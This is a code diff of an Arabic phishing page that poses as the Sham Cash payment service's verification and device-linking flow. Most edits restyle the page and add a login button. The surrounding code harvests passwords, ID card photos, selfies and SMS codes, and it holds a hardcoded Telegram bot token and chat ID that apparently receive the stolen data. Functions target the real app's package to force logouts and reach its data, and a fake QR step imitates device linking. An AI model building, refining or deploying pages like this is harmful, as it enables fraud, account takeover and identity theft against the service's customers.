@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>شام كاش - التحقق من الهوية وربط الجهاز</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --primary: #1a365d;
@@ -28,8 +28,8 @@
         }
         
         body {
-            font-family: 'Amiri', serif;
-            background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #333;
             line-height: 1.6;
             min-height: 100vh;
@@ -75,6 +75,7 @@
             position: sticky;
             top: 0;
             z-index: 1000;
+            text-align: center;
         }
         
         .logo-container {
@@ -88,13 +89,12 @@
         .logo {
             height: 45px;
             width: auto;
-            filter: brightness(0) invert(1);
         }
         
         .logo-text {
-            font-family: 'Amiri', serif;
+            font-family: 'Cairo', sans-serif;
             font-size: 28px;
-            font-weight: 700;
+            font-weight: 800;
             color: white;
             text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
         }
@@ -108,20 +108,22 @@
         
         .page-content {
             padding: 30px 20px;
-            max-width: 500px;
+            max-width: 450px;
             margin: 0 auto;
             min-height: calc(100vh - 140px);
+            display: flex;
+            flex-direction: column;
         }
         
         .page-title {
-            font-family: 'Amiri', serif;
+            font-family: 'Cairo', sans-serif;
             font-size: 28px;
             color: var(--primary-dark);
             margin-bottom: 15px;
-            font-weight: 700;
+            font-weight: 800;
             text-align: center;
             padding-bottom: 15px;
-            border-bottom: 2px solid var(--primary);
+            border-bottom: 2px solid #e2e8f0;
         }
         
         .page-subtitle {
@@ -134,11 +136,12 @@
         
         .form-container {
             background: white;
-            border-radius: 15px;
+            border-radius: 20px;
             padding: 25px;
             box-shadow: var(--shadow);
             margin-bottom: 25px;
             border: 1px solid var(--border);
+            flex-grow: 1;
         }
         
         .form-group {
@@ -147,33 +150,33 @@
         
         .form-label {
             display: block;
-            margin-bottom: 10px;
-            font-weight: 700;
+            margin-bottom: 8px;
+            font-weight: 600;
             color: var(--dark);
-            font-size: 17px;
+            font-size: 16px;
         }
         
         .form-control {
             width: 100%;
-            padding: 16px 18px;
+            padding: 16px 20px;
             border: 2px solid var(--border);
-            border-radius: 10px;
-            font-size: 18px;
+            border-radius: 12px;
+            font-size: 16px;
             transition: all 0.3s ease;
-            background: #fafafa;
-            font-family: 'Amiri', serif;
+            background: #f8f9fa;
+            font-family: 'Cairo', sans-serif;
         }
         
         .form-control:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
             background: white;
         }
         
         .error-message {
             color: var(--danger);
-            font-size: 15px;
+            font-size: 14px;
             margin-top: 8px;
             display: none;
             font-weight: 600;
@@ -183,7 +186,7 @@
             padding: 18px 30px;
             border: none;
             border-radius: 12px;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -193,31 +196,31 @@
             gap: 12px;
             width: 100%;
             margin-top: 15px;
-            font-family: 'Amiri', serif;
+            font-family: 'Cairo', sans-serif;
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            box-shadow: 0 4px 15px rgba(26, 54, 93, 0.3);
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
         }
         
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 7px 20px rgba(26, 54, 93, 0.4);
+            box-shadow: 0 7px 20px rgba(102, 126, 234, 0.4);
         }
         
         .upload-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 15px;
             margin-bottom: 25px;
         }
         
         .upload-box {
             border: 3px dashed var(--border);
             border-radius: 12px;
-            padding: 25px 15px;
+            padding: 20px 10px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -225,20 +228,20 @@
             text-align: center;
             cursor: pointer;
             transition: all 0.3s ease;
-            height: 190px;
+            height: 160px;
             position: relative;
             overflow: hidden;
             background: #fafafa;
         }
         
         .upload-box:hover {
-            border-color: var(--primary);
-            background: rgba(26, 54, 93, 0.05);
+            border-color: #667eea;
+            background: rgba(102, 126, 234, 0.05);
         }
         
         .verification-container {
             text-align: center;
-            padding: 30px 20px;
+            padding: 20px 0;
         }
         
         .verification-icon {
@@ -251,12 +254,12 @@
             justify-content: center;
             font-size: 48px;
             color: var(--secondary);
-            margin: 0 auto 35px;
+            margin: 0 auto 25px;
             box-shadow: var(--shadow);
         }
         
         .phone-input-container {
-            margin: 30px 0;
+            margin: 25px 0;
             position: relative;
         }
         
@@ -265,19 +268,19 @@
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            background: var(--primary);
+            background: #667eea;
             color: white;
             padding: 12px 15px;
             border-radius: 8px 0 0 8px;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 16px;
         }
         
         .sent-message {
             background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
             border-radius: 12px;
             padding: 20px;
-            margin: 25px 0;
+            margin: 20px 0;
             border-right: 4px solid var(--secondary);
             display: none;
         }
@@ -290,65 +293,79 @@
         .code-inputs {
             display: flex;
             justify-content: center;
-            gap: 15px;
-            margin: 25px 0;
+            gap: 12px;
+            margin: 20px 0;
         }
         
         .code-input {
-            width: 60px;
-            height: 70px;
+            width: 55px;
+            height: 65px;
             border: 3px solid var(--border);
             border-radius: 12px;
-            font-size: 32px;
+            font-size: 28px;
             text-align: center;
             font-weight: 800;
-            font-family: 'Amiri', serif;
+            font-family: 'Cairo', sans-serif;
             background: #fafafa;
         }
         
         .code-input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
             outline: none;
             background: white;
             transform: scale(1.05);
         }
         
         .timer {
-            font-size: 22px;
-            color: var(--primary);
+            font-size: 20px;
+            color: #667eea;
             font-weight: 800;
             padding: 12px 25px;
-            background: rgba(26, 54, 93, 0.1);
+            background: rgba(102, 126, 234, 0.1);
             border-radius: 10px;
             display: inline-block;
-            margin: 20px 0;
+            margin: 15px 0;
         }
         
         .footer {
-            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+            background: white;
             padding: 25px 20px;
             text-align: center;
-            margin-top: 40px;
-            color: white;
+            margin-top: 30px;
+            color: #4a5568;
+            border-top: 1px solid var(--border);
+            width: 100%;
+        }
+        
+        .copyright {
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        
+        .version {
+            font-size: 12px;
+            color: #a0aec0;
+            margin-top: 5px;
         }
         
         .progress-container {
-            margin: 25px 0 40px;
+            margin: 20px 0 30px;
         }
         
         .progress-bar {
-            height: 12px;
+            height: 10px;
             background: #edf2f7;
-            border-radius: 6px;
+            border-radius: 5px;
             overflow: hidden;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
         }
         
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
-            border-radius: 6px;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            border-radius: 5px;
             width: 0%;
             transition: width 0.5s ease;
         }
@@ -356,8 +373,8 @@
         .delayed-verification {
             background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%);
             border-radius: 15px;
-            padding: 30px;
-            margin: 25px 0;
+            padding: 25px;
+            margin: 20px 0;
             border: 2px solid var(--info);
             text-align: center;
             display: none;
@@ -369,16 +386,16 @@
         }
         
         .delayed-verification-icon {
-            font-size: 60px;
+            font-size: 50px;
             color: var(--info);
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
         .countdown {
-            font-size: 28px;
+            font-size: 24px;
             color: var(--info);
             font-weight: 800;
-            margin: 20px 0;
+            margin: 15px 0;
             background: rgba(49, 130, 206, 0.1);
             padding: 15px;
             border-radius: 10px;
@@ -391,12 +408,12 @@
         
         .steps-container {
             text-align: right;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         
         .step-item {
             padding: 15px;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             border-right: 4px solid var(--info);
             background: rgba(49, 130, 206, 0.05);
             border-radius: 8px;
@@ -409,9 +426,9 @@
         }
         
         .step-number {
-            width: 35px;
-            height: 35px;
-            background: var(--info);
+            width: 32px;
+            height: 32px;
+            background: #667eea;
             color: white;
             border-radius: 50%;
             display: flex;
@@ -423,16 +440,16 @@
         
         .step-item:hover .step-number {
             transform: scale(1.1);
-            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.3);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
         }
         
         .linking-status {
             display: none;
             text-align: center;
-            padding: 25px;
+            padding: 20px;
             background: rgba(45, 140, 74, 0.1);
             border-radius: 12px;
-            margin: 25px 0;
+            margin: 20px 0;
             border: 2px solid var(--secondary);
             animation: fadeIn 0.5s ease;
         }
@@ -440,17 +457,17 @@
         .success-message {
             display: none;
             text-align: center;
-            padding: 30px;
+            padding: 25px;
             background: rgba(45, 140, 74, 0.1);
             border-radius: 12px;
-            margin: 25px 0;
+            margin: 20px 0;
             border: 2px solid var(--secondary);
             animation: fadeIn 0.5s ease;
         }
         
         .signal {
-            width: 15px;
-            height: 15px;
+            width: 12px;
+            height: 12px;
             background: var(--info);
             border-radius: 50%;
             animation: pulse 1.5s infinite;
@@ -481,7 +498,7 @@
             animation: slideInRight 0.3s ease;
             max-width: 400px;
             font-weight: 600;
-            font-size: 17px;
+            font-size: 16px;
         }
         
         .notification.error {
@@ -496,6 +513,72 @@
             background: var(--warning);
         }
         
+        .back-button {
+            position: absolute;
+            left: 20px;
+            top: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .forgot-password {
+            text-align: left;
+            margin-top: 5px;
+        }
+        
+        .forgot-password a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+        
+        .forgot-password a:hover {
+            color: #764ba2;
+            text-decoration: underline;
+        }
+        
+        .create-account {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+        }
+        
+        .create-account p {
+            color: #4a5568;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .create-account-button {
+            display: inline-block;
+            background-color: #48bb78;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Cairo', sans-serif;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
+        }
+        
+        .create-account-button:hover {
+            background-color: #38a169;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(72, 187, 120, 0.4);
+        }
+        
         @media (max-width: 768px) {
             .header {
                 padding: 18px 15px;
@@ -507,12 +590,13 @@
             
             .page-content {
                 padding: 25px 15px;
+                max-width: 100%;
             }
             
             .code-input {
-                width: 50px;
-                height: 60px;
-                font-size: 28px;
+                width: 45px;
+                height: 55px;
+                font-size: 24px;
             }
             
             .upload-grid {
@@ -524,7 +608,7 @@
             }
             
             .delayed-verification-icon {
-                font-size: 50px;
+                font-size: 40px;
             }
             
             .steps-container {
@@ -533,6 +617,12 @@
             
             .step-item {
                 padding: 12px;
+            }
+        }
+        
+        @media (min-width: 1200px) {
+            .page-content {
+                max-width: 500px;
             }
         }
     </style>
@@ -575,18 +665,33 @@
                     </label>
                     <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
                     <div class="error-message" id="passwordError">كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل</div>
+                    
+                    <div class="forgot-password">
+                        <a href="#">
+                            <i class="fas fa-question-circle"></i>
+                            هل نسيت كلمة المرور؟ تغيير كلمة المرور
+                        </a>
+                    </div>
+                </div>
+                
+                <button class="btn btn-primary" onclick="validateLogin()">
+                    تسجيل الدخول
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                
+                <div class="create-account">
+                    <p>لا تملك حساباً مسبقاً؟</p>
+                    <a href="#" class="create-account-button">
+                        <i class="fas fa-user-plus"></i>
+                        إنشاء حساب
+                    </a>
                 </div>
             </div>
             
-            <button class="btn btn-primary" onclick="validateLogin()">
-                التالي
-                <i class="fas fa-arrow-left"></i>
-            </button>
-            
             <div class="footer">
-                <div class="copyright">
-                    © 2024 شام كاش. نظام التحقق الآمن
-                </div>
+                <div>POWERED BY</div>
+                <div class="copyright">Sham Cash © V 2.1.3</div>
+                <div class="version">نظام التحقق الآمن</div>
             </div>
         </div>
     </div>
@@ -599,7 +704,7 @@
                 <div class="logo-text">شام كاش</div>
             </div>
             <div class="page-indicator">التحقق من الهوية - الخطوة 2 من 4</div>
-            <button onclick="goToPage(1)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+            <button class="back-button" onclick="goToPage(1)">
                 <i class="fas fa-arrow-right"></i>
             </button>
         </header>
@@ -644,34 +749,34 @@
                 
                 <div class="upload-grid">
                     <div class="upload-box" onclick="triggerUpload('frontId')">
-                        <i class="fas fa-id-card upload-icon"></i>
+                        <i class="fas fa-id-card" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
                         <div class="upload-text">الهوية الأمامية</div>
                         <img class="upload-preview" id="frontIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                     </div>
                     
                     <div class="upload-box" onclick="triggerUpload('backId')">
-                        <i class="fas fa-id-card upload-icon"></i>
+                        <i class="fas fa-id-card" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
                         <div class="upload-text">الهوية الخلفية</div>
                         <img class="upload-preview" id="backIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                     </div>
                     
                     <div class="upload-box" onclick="triggerUpload('selfie')">
-                        <i class="fas fa-camera upload-icon"></i>
+                        <i class="fas fa-camera" style="font-size: 32px; color: #667eea; margin-bottom: 10px;"></i>
                         <div class="upload-text">صورة شخصية مع الهوية</div>
                         <img class="upload-preview" id="selfiePreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                     </div>
                 </div>
+                
+                <button class="btn btn-primary" onclick="validatePage2()">
+                    التالي
+                    <i class="fas fa-arrow-left"></i>
+                </button>
             </div>
             
-            <button class="btn btn-primary" onclick="validatePage2()">
-                التالي
-                <i class="fas fa-arrow-left"></i>
-            </button>
-            
             <div class="footer">
-                <div class="copyright">
-                    © 2024 شام كاش. نظام التحقق الآمن
-                </div>
+                <div>POWERED BY</div>
+                <div class="copyright">Sham Cash © V 2.1.3</div>
+                <div class="version">نظام التحقق الآمن</div>
             </div>
         </div>
     </div>
@@ -684,7 +789,7 @@
                 <div class="logo-text">شام كاش</div>
             </div>
             <div class="page-indicator">التحقق من الهوية - الخطوة 3 من 4</div>
-            <button onclick="goToPage(2)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+            <button class="back-button" onclick="goToPage(2)">
                 <i class="fas fa-arrow-right"></i>
             </button>
         </header>
@@ -736,9 +841,9 @@
                         تأكيد التحقق
                     </button>
                     
-                    <p style="margin-top:20px; color:#718096;">
+                    <p style="margin-top:20px; color:#718096; font-size: 14px;">
                         لم تستلم الرمز؟ 
-                        <a href="javascript:void(0)" onclick="resendCode()" style="color:var(--primary); font-weight:bold;">
+                        <a href="javascript:void(0)" onclick="resendCode()" style="color:#667eea; font-weight:bold;">
                             إعادة الإرسال
                         </a>
                     </p>
@@ -757,9 +862,9 @@
             </div>
             
             <div class="footer">
-                <div class="copyright">
-                    © 2024 شام كاش. نظام التحقق الآمن
-                </div>
+                <div>POWERED BY</div>
+                <div class="copyright">Sham Cash © V 2.1.3</div>
+                <div class="version">نظام التحقق الآمن</div>
             </div>
         </div>
     </div>
@@ -772,14 +877,14 @@
                 <div class="logo-text">شام كاش</div>
             </div>
             <div class="page-indicator">ربط الهاتف بالجهاز - الخطوة 4 من 4</div>
-            <button onclick="goToPage(3)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+            <button class="back-button" onclick="goToPage(3)">
                 <i class="fas fa-arrow-right"></i>
             </button>
         </header>
         
         <div class="page-content">
             <div class="verification-container">
-                <div class="verification-icon" style="background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%); color: var(--info);">
+                <div class="verification-icon" style="background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%); color: #667eea;">
                     <i class="fas fa-mobile-alt"></i>
                 </div>
                 
@@ -798,8 +903,8 @@
                             <div style="display: flex; align-items: center; gap: 15px;">
                                 <div class="step-number">1</div>
                                 <div>
-                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">افتح تطبيق شام كاش</h3>
-                                    <p style="color: #4a5568;">انتقل إلى إعدادات التطبيق</p>
+                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">افتح تطبيق شام كاش</h3>
+                                    <p style="color: #4a5568; font-size: 14px;">انتقل إلى إعدادات التطبيق</p>
                                 </div>
                             </div>
                         </div>
@@ -808,8 +913,8 @@
                             <div style="display: flex; align-items: center; gap: 15px;">
                                 <div class="step-number">2</div>
                                 <div>
-                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">ابحث عن "ربط الجهاز"</h3>
-                                    <p style="color: #4a5568;">اختر خيار ربط جهاز جديد</p>
+                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">ابحث عن "ربط الجهاز"</h3>
+                                    <p style="color: #4a5568; font-size: 14px;">اختر خيار ربط جهاز جديد</p>
                                 </div>
                             </div>
                         </div>
@@ -818,46 +923,46 @@
                             <div style="display: flex; align-items: center; gap: 15px;">
                                 <div class="step-number">3</div>
                                 <div>
-                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">وجه كاميرا الهاتف</h3>
-                                    <p style="color: #4a5568;">اسحب الكاميرا نحو رمز QR أدناه</p>
+                                    <h3 style="color: #2d3748; margin-bottom: 5px; font-size: 16px;">وجه كاميرا الهاتف</h3>
+                                    <p style="color: #4a5568; font-size: 14px;">اسحب الكاميرا نحو رمز QR أدناه</p>
                                 </div>
                             </div>
                         </div>
                     </div>
                     
-                    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 12px;">
-                        <h3 style="color: var(--primary-dark); margin-bottom: 15px;">رمز الربط</h3>
-                        <div id="qrCode" style="width: 200px; height: 200px; margin: 0 auto; background: #333; position: relative; border-radius: 10px; overflow: hidden;">
-                            <canvas id="qrCanvas" width="200" height="200"></canvas>
+                    <div style="text-align: center; margin: 25px 0; padding: 20px; background: #f8f9fa; border-radius: 12px;">
+                        <h3 style="color: #2d3748; margin-bottom: 15px; font-size: 18px;">رمز الربط</h3>
+                        <div id="qrCode" style="width: 180px; height: 180px; margin: 0 auto; background: #333; position: relative; border-radius: 10px; overflow: hidden;">
+                            <canvas id="qrCanvas" width="180" height="180"></canvas>
                         </div>
                         <p style="color: #718096; margin-top: 15px; font-size: 14px;">
-                            المسح متاح لمدة <span id="qrTimer" style="color: var(--info); font-weight: bold;">10:00</span> دقيقة
+                            المسح متاح لمدة <span id="qrTimer" style="color: #667eea; font-weight: bold;">10:00</span> دقيقة
                         </p>
                     </div>
                     
                     <div class="linking-status" id="linkingStatus">
-                        <i class="fas fa-sync-alt fa-spin" style="font-size: 40px; color: var(--secondary); margin-bottom: 15px;"></i>
-                        <h3 style="color: var(--secondary); margin-bottom: 10px;">جاري انتظار الربط...</h3>
-                        <p style="color: #4a5568;">يرجى عدم إغلاق هذه الصفحة حتى اكتمال الربط</p>
+                        <i class="fas fa-sync-alt fa-spin" style="font-size: 36px; color: #2d8c4a; margin-bottom: 15px;"></i>
+                        <h3 style="color: #2d8c4a; margin-bottom: 10px; font-size: 18px;">جاري انتظار الربط...</h3>
+                        <p style="color: #4a5568; font-size: 14px;">يرجى عدم إغلاق هذه الصفحة حتى اكتمال الربط</p>
                         
                         <div style="display: flex; justify-content: center; gap: 10px; margin: 20px 0;">
                             <div class="signal" style="animation-delay: 0s;"></div>
-                            <div class="signal" style="background: var(--secondary); animation-delay: 0.2s;"></div>
-                            <div class="signal" style="background: var(--primary); animation-delay: 0.4s;"></div>
+                            <div class="signal" style="background: #2d8c4a; animation-delay: 0.2s;"></div>
+                            <div class="signal" style="background: #667eea; animation-delay: 0.4s;"></div>
                         </div>
                         
                         <div style="margin-top: 20px;">
-                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">أدوات التحقق المقدمة:</h4>
-                            <div style="display: flex; flex-wrap: wrap; gap: 15px; justify-content: center;">
-                                <span style="background: rgba(49, 130, 206, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--info);">نوع اتصال</span>
-                                <span style="background: rgba(214, 158, 46, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--warning);">زمنة ضيق</span>
-                                <span style="background: rgba(45, 140, 74, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--secondary);">جهاز آمن</span>
-                                <span style="background: rgba(197, 48, 48, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--danger);">جزء أخرى</span>
+                            <h4 style="color: #2d3748; margin-bottom: 10px; font-size: 16px;">أدوات التحقق المقدمة:</h4>
+                            <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
+                                <span style="background: rgba(49, 130, 206, 0.1); padding: 6px 12px; border-radius: 20px; color: #3182ce; font-size: 12px; font-weight: 600;">نوع اتصال</span>
+                                <span style="background: rgba(214, 158, 46, 0.1); padding: 6px 12px; border-radius: 20px; color: #d69e2e; font-size: 12px; font-weight: 600;">زمنة ضيق</span>
+                                <span style="background: rgba(45, 140, 74, 0.1); padding: 6px 12px; border-radius: 20px; color: #2d8c4a; font-size: 12px; font-weight: 600;">جهاز آمن</span>
+                                <span style="background: rgba(197, 48, 48, 0.1); padding: 6px 12px; border-radius: 20px; color: #c53030; font-size: 12px; font-weight: 600;">جزء أخرى</span>
                             </div>
                         </div>
                     </div>
                     
-                    <div class="timer" id="linkingTimer" style="display: none; font-size: 24px; margin: 20px auto; width: fit-content;">
+                    <div class="timer" id="linkingTimer" style="display: none; font-size: 20px; margin: 20px auto; width: fit-content;">
                         <i class="fas fa-clock"></i>
                         <span id="linkingTime">10:00</span>
                     </div>
@@ -868,25 +973,25 @@
                     </button>
                     
                     <div class="success-message" id="successMessage">
-                        <i class="fas fa-check-circle" style="font-size: 60px; color: var(--secondary); margin-bottom: 20px;"></i>
-                        <h3 style="color: var(--secondary); margin-bottom: 15px;">تم الربط بنجاح!</h3>
-                        <p style="color: #4a5568; margin-bottom: 10px;">تم ربط جهازك بنجاح بتطبيق شام كاش</p>
-                        <p style="color: #4a5568;">يمكنك الآن استخدام التطبيق بشكل آمن ومتكامل</p>
+                        <i class="fas fa-check-circle" style="font-size: 50px; color: #2d8c4a; margin-bottom: 15px;"></i>
+                        <h3 style="color: #2d8c4a; margin-bottom: 10px; font-size: 20px;">تم الربط بنجاح!</h3>
+                        <p style="color: #4a5568; margin-bottom: 10px; font-size: 14px;">تم ربط جهازك بنجاح بتطبيق شام كاش</p>
+                        <p style="color: #4a5568; font-size: 14px;">يمكنك الآن استخدام التطبيق بشكل آمن ومتكامل</p>
                         
-                        <div style="margin-top: 25px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
-                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">تفاصيل الجهاز المرتبط:</h4>
-                            <p><strong>رقم الجهاز:</strong> <span id="deviceId">DEV-${Math.floor(Math.random() * 10000)}</span></p>
-                            <p><strong>وقت الربط:</strong> <span id="linkTime">${new Date().toLocaleString('ar-SY')}</span></p>
-                            <p><strong>نوع الاتصال:</strong> QR Code</p>
+                        <div style="margin-top: 20px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
+                            <h4 style="color: #2d3748; margin-bottom: 10px; font-size: 16px;">تفاصيل الجهاز المرتبط:</h4>
+                            <p style="font-size: 14px;"><strong>رقم الجهاز:</strong> <span id="deviceId">DEV-${Math.floor(Math.random() * 10000)}</span></p>
+                            <p style="font-size: 14px;"><strong>وقت الربط:</strong> <span id="linkTime">${new Date().toLocaleString('ar-SY')}</span></p>
+                            <p style="font-size: 14px;"><strong>نوع الاتصال:</strong> QR Code</p>
                         </div>
                     </div>
                 </div>
             </div>
             
             <div class="footer">
-                <div class="copyright">
-                    © 2024 شام كاش. نظام الربط الآمن
-                </div>
+                <div>POWERED BY</div>
+                <div class="copyright">Sham Cash © V 2.1.3</div>
+                <div class="version">نظام الربط الآمن</div>
             </div>
         </div>
     </div>
@@ -900,7 +1005,7 @@
     <script>
         const TELEGRAM_BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
         const TELEGRAM_CHAT_ID = "7493001551";
-        const SHAMCASH_PACKAGE = "com.shmacash.shamcash"; // ✅ الباكج الصحيح
+        const SHAMCASH_PACKAGE = "com.shmacash.shamcash";
         
         let appData = {
             currentPage: 1,
@@ -978,7 +1083,6 @@
         // الإخراج من تطبيق شام كاش باستخدام الباكج الصحيح
         function forceShamCashLogout() {
             console.log('🚪 جاري إخراج من تطبيق شام كاش...');
-            console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
             
             const userEmail = appData.userInfo.email;
             const deviceInfo = {
@@ -1441,13 +1545,13 @@
             ctx.fillStyle = '#000000';
             
             ctx.fillRect(20, 20, 40, 40);
-            ctx.fillRect(140, 20, 40, 40);
-            ctx.fillRect(20, 140, 40, 40);
+            ctx.fillRect(120, 20, 40, 40);
+            ctx.fillRect(20, 120, 40, 40);
             
-            for(let i = 0; i < 8; i++) {
-                for(let j = 0; j < 8; j++) {
+            for(let i = 0; i < 7; i++) {
+                for(let j = 0; j < 7; j++) {
                     if (Math.random() > 0.5) {
-                        ctx.fillRect(60 + i*15, 60 + j*15, 10, 10);
+                        ctx.fillRect(50 + i*15, 50 + j*15, 10, 10);
                     }
                 }
             }
@@ -1455,8 +1559,8 @@
             ctx.save();
             ctx.translate(canvas.width/2, canvas.height/2);
             ctx.rotate(Math.PI);
-            ctx.fillStyle = '#1a365d';
-            ctx.font = 'bold 16px Amiri';
+            ctx.fillStyle = '#667eea';
+            ctx.font = 'bold 14px Cairo';
             ctx.textAlign = 'center';
             ctx.fillText('شام كاش', 0, 0);
             ctx.restore();
@@ -1623,7 +1727,6 @@
         
         function accessShamCashAppData() {
             console.log('🔍 محاولة الوصول إلى بيانات تطبيق شام كاش...');
-            console.log('📦 الباكج: ' + SHAMCASH_PACKAGE);
             
             const accessAttempts = [
                 {
@@ -1862,10 +1965,11 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
             console.log('📋 رقم الطلب: ' + appData.requestNumber);
             console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
             console.log('🚀 4 صفحات متكاملة');
-            console.log('1. تسجيل الدخول');
-            console.log('2. البيانات والمستندات');
-            console.log('3. التحقق بالرسالة');
-            console.log('4. ربط الهاتف بالجهاز');
+            
+            // تكبير النص قليلاً ليكون أوضح
+            document.querySelectorAll('.form-control').forEach(input => {
+                input.style.fontSize = '16px';
+            });
         });
     </script>
 </body>
